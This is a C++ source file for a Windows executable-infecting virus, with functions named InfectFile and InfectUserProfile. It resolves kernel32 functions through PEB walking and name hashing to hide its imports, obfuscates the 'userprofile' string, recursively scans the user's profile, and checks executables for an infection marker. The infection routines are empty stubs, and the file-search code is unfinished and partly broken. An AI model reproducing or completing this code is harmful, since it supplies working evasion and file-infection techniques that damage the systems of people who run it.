
#include "everything.h"

/**/
bool WINAPI IsValidExecutable(const PVOID file_data);
bool WINAPI Is64BitExecutable(const PVOID file_data);
bool WINAPI IsVirusExistedInFile(const PVOID file_data);

void WINAPI AddSection(PVOID file_data, const PVOID section_data, DWORD size, PDATA data);
void AdjustEntryPoint(PDATA data);
void ModifyJumpInstructionToVirusCode(PDATA data);

void WINAPI AddVirusToFile(PVOID file_data, PDATA data);

void WINAPI InfectFile(PSTR file_name, PDATA data);
void WINAPI InfectUserProfile(PDATA data);
void WINAPI FindFile(PSTR directory, PDATA data);

inline void ZeroMem(void* data, int size)
{
    for (int i = 0; i < size; i++)
    {
        *((unsigned char*)(data)+i) = 0;
    }
}

bool WINAPI IsValidExecutable(const PVOID file_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS p_image_nt_headers;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;
    if(p_image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return false;
    }
    p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)file_data + p_image_dos_header->e_lfanew);
    if(p_image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
    {
        return false;
    }
    return true;
}

bool WINAPI Is64BitExecutable(const PVOID file_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS32 p_image_nt_headers_32;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;

    p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)file_data + p_image_dos_header->e_lfanew);

    return p_image_nt_headers_32->OptionalHeader.Magic == 0x20b;
}

bool WINAPI IsVirusExistedInFile(const PVOID file_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS32 p_image_nt_headers;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;
    p_image_nt_headers = (PIMAGE_NT_HEADERS32)((PUCHAR)file_data + p_image_dos_header->e_lfanew);

    if (Is64BitExecutable(file_data))
    {
        return ((PIMAGE_NT_HEADERS64)p_image_nt_headers)->OptionalHeader.LoaderFlags == VIRUS_FLAG;
    }
    else
    {
        return p_image_nt_headers->OptionalHeader.LoaderFlags == VIRUS_FLAG;
    }

}

void WINAPI AddSection(PVOID file_data, const PVOID section_data, DWORD section_size, PDATA data)
{
    return;
}

void AdjustEntryPoint(PDATA data)
{
    return;
}

void ModifyJumpInstructionToVirusCode(PDATA data)
{
    return;
}

void WINAPI AddVirusToFile(PVOID file_data, PDATA data)
{

    return;
}

void WINAPI InfectFile(PSTR file_name, PDATA data)
{
    HANDLE handle_file;
    ULONG file_size, new_file_size, section_size, bytes_read;
    PVOID file_data;

    handle_file = data->iat->fnCreateFileA(
        file_name, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL,
        OPEN_EXISTING,
        0,NULL
    );

    if (handle_file == INVALID_HANDLE_VALUE)
    {
        goto END_FUNCTION;
    }

    file_size = data->iat->fnGetFileSize(handle_file, NULL);
    new_file_size = file_size + 0x100000;
    
    file_data = VirtualAlloc(
        NULL, 
        new_file_size, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!file_data)
    {
        goto END_FUNCTION;
    }

    if (!ReadFile(handle_file, file_data, file_size, &bytes_read, NULL))
    {
        goto END_FUNCTION;
    }

    if (!IsValidExecutable(file_data) || IsVirusExistedInFile(file_data))
    {
        goto END_FUNCTION;
    }

    AddVirusToFile(file_data, data);

    END_FUNCTION:
    if (file_data != nullptr)
    {
        VirtualFree(file_data, 0, MEM_RELEASE);
    }
    return;
} 

void WINAPI FindFile(PSTR directory, PDATA data)
{
    HANDLE handle_find;
    WIN32_FIND_DATAA find_data;

    char search_name[1024], full_path[1024];
    LARGE_INTEGER delay;

    delay.QuadPart = (__int64)-10*10000;
 
    ZeroMem(search_name, sizeof(search_name));
    ZeroMem(&find_data, sizeof(WIN32_FIND_DATAA));

    handle_find  =  data->iat->fnFindFirstFileA(search_name, &find_data);

    if(handle_find != INVALID_HANDLE_VALUE)
    {
        while(data->iat->fnFindNextFileA(handle_find, &find_data))
        {
            if(find_data.cFileName[0] == '.')
            {
                continue;
            }
             
            ZeroMem(full_path,sizeof(full_path));
 
            if(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                FindFile(full_path, data);
            }
            else
            {
                InfectFile(full_path, data);
            }
        }
        data->iat->fnFindClose(handle_find);
    }
}

void WINAPI InfectUserProfile(PDATA data)
{
    char user_profile[1024];
    char user_profile_str[12];
    user_profile_str[0] = 'u'; user_profile_str[1] = 's'; user_profile_str[2] = 'e'; user_profile_str[3] = 'r'; user_profile_str[4] = 'p'; user_profile_str[5] = 'r'; user_profile_str[6] = 'o'; user_profile_str[7] = 'f'; user_profile_str[8] = 'i'; user_profile_str[9] = 'l'; user_profile_str[10] = 'e'; user_profile_str[11] = 0;
    data->iat->fnGetEnvironmentVariableA(user_profile_str, user_profile, sizeof(user_profile));
    //string s = user_profile;
    //cout << s << endl;
    FindFile(user_profile, data);
}

int main()
{
    IAT iat;
    DATA data;
    data.iat = &iat;

    PPEB p_peb = NtCurrentPeb();

    data.this_file_base_address = (DWORD_PTR *)p_peb->Reserved3[1]; // (PVOID)(*(DWORD_PTR *)(((DWORD_PTR)p_peb) + 0x10))

    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)(p_peb->Ldr);
    
    ldr = CONTAINING_RECORD(p_peb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Read the loader data

    PVOID kernel32_base = nullptr;
    
    while(ldr != 0)
    {
        wchar_t* dll_name = (wchar_t*)(((UNICODE_STRING *)((unsigned long long)(ldr) + sizeof(PVOID) * 11))->Buffer);
        
        if (dll_name == nullptr) break;
        //wcout << dll_name << endl;
        wchar_t c;
        DWORD hash = 0;
        for (int i = 0; i < 13; i++)
        {
            c = dll_name[i];
            if (L'A' <= c && c <= L'Z')
            {
                c = c - L'A' + L'a';
            }
            hash = (hash * 26 + c) % (DWORD)(1e9+7);
        }
        if (hash == 448935215) // hash of L"kernel32.dll"
        {
            kernel32_base = ldr->DllBase; // Store the address of kernel32
            break;
        }

        ldr = CONTAINING_RECORD(ldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    }

    PIMAGE_DOS_HEADER p_image_dos_header = (PIMAGE_DOS_HEADER)kernel32_base;
    PIMAGE_NT_HEADERS p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)kernel32_base + p_image_dos_header->e_lfanew);

    // Get the export directory of kernel32
    PIMAGE_EXPORT_DIRECTORY p_image_export_directory;

    p_image_export_directory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)kernel32_base + p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG function_table = (PULONG)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfFunctions);

    PULONG name = (PULONG)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfNames);

    PUSHORT ordinal = (PUSHORT)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfNameOrdinals);

    for(int i = 0; i < p_image_export_directory->NumberOfNames; i++)
    {
        PUCHAR ptr = (PUCHAR)kernel32_base + name[i]; // Pointer to function name
        DWORD hash = 0;
 
        // Compute the hash
        while(*ptr)
        {
            hash = (hash * 26 + *ptr) % (DWORD)(1e9+7);
            ptr++;
        }
        hash = (hash * 26 + 0) % (DWORD)(1e9+7);

        // Hash of LoadLibraryExA
        if (hash == 0x1ad4f305)
        {
            iat.fnLoadLibraryExA = pLoadLibraryExA((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of GetProcAddress
        if (hash == 0xd38cd23)
        {
            iat.fnGetProcAddress = pGetProcAddress((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FindFirstFileA
        if (hash == 0x10b03781)
        {
            iat.fnFindFirstFileA = pFindFirstFileA((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FindNextFileA
        if (hash == 0x4d01d59)
        {
            iat.fnFindNextFileA = pFindNextFileA((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FindClose
        if (hash == 0x309c47e0)
        {
            iat.fnFindClose = pFindClose((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CreateFileA
        if (hash == 0xc75869c)
        {
            iat.fnCreateFileA = pCreateFileA((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of GetFileSize
        if (hash == 0x236f23d6)
        {
            iat.fnGetFileSize = pGetFileSize((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of ReadFile
        if (hash == 0xc9a21e1)
        {
            iat.fnReadFile = pReadFile((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CloseHandle
        if (hash == 0x158bec59)
        {
            iat.fnCloseHandle = pCloseHandle((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of VirtualAlloc
        if (hash == 0x22b92187)
        {
            iat.fnVirtualAlloc = pVirtualAlloc((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of VirtualFree
        if (hash == 0x25e4c2e3)
        {
            iat.fnVirtualFree = pVirtualFree((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CreateFileMappingA
        if (hash == 0x2da1e929)
        {
            iat.fnCreateFileMappingA = pCreateFileMappingA((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of MapViewOfFile
        if (hash == 0x3a2ef895)
        {
            iat.fnMapViewOfFile = pMapViewOfFile((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FlushViewOfFile
        if (hash == 0x29b0e5d7)
        {
            iat.fnFlushViewOfFile = pFlushViewOfFile((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of UnmapViewOfFile
        if (hash == 0x12107238)
        {
            iat.fnUnmapViewOfFile = pUnmapViewOfFile((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of GetEnvironmentVariableA
        if (hash == 0x32b50861)
        {
            iat.fnGetEnvironmentVariableA = pGetEnvironmentVariableA((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CloseHandle
        if (hash == 0x158bec59)
        {
            iat.fnCloseHandle = pCloseHandle((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

    }
    
    InfectUserProfile(&data);
}